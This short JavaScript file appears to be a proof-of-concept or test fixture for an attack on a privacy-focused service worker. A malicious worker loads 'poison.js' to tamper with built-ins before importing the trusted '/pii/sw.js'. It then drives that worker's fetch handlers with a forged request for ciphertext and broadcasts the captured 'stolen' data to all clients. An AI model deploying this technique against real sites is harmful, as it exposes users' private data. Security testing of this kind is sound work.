// An attacker's worker. Imports run in order, so the trusted worker's code runs
// with the poisoned built-ins.
import "./poison.js";
import "/pii/sw.js";

addEventListener("activate", async () => {
  const request = { url: "http://localhost/pii/ciphertext", destination: "iframe" };
  for (const handler of self.fetchHandlers) {
    handler({ request, respondWith: (response) => Promise.resolve(response).catch(() => {}) });
  }
  const clients = await self.clients.matchAll({ includeUncontrolled: true });
  for (const client of clients) client.postMessage(self.stolen);
});
